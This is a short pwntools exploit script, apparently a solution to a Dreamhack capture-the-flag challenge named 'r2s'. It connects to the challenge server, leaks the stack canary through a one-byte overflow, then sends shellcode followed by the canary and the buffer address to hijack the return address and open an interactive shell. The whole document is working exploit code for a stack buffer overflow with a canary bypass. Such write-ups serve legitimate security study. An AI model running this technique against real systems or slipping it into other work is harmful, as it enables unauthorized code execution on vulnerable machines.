
from pwn import *

context.arch = 'amd64'

p = remote('host3.dreamhack.games', 15778)
#p = process('./r2s')

p.recvuntil('buf: ')
buf_addr = int(p.recvline()[:-1],16)
print(hex(buf_addr))

p.recvuntil('$rbp: ')
distance_buf_rbp = int(p.recvline()[:-1])
print(hex(distance_buf_rbp))
distance_buf_canary = distance_buf_rbp-8
print(hex(distance_buf_canary))

payload = b'a'*(distance_buf_canary+1)
p.sendafter('Input: ',payload)
p.recvuntil(payload)
canary = u64(b'\x00'+p.recvn(7))
print(hex(canary))

sh = asm(shellcraft.sh())
payload = sh.ljust(distance_buf_canary,b'a') + p64(canary) + b'a'*0x8 + p64(buf_addr)
# gets() receives input until '\n' is received
p.sendlineafter('Input: ',payload)

p.interactive()
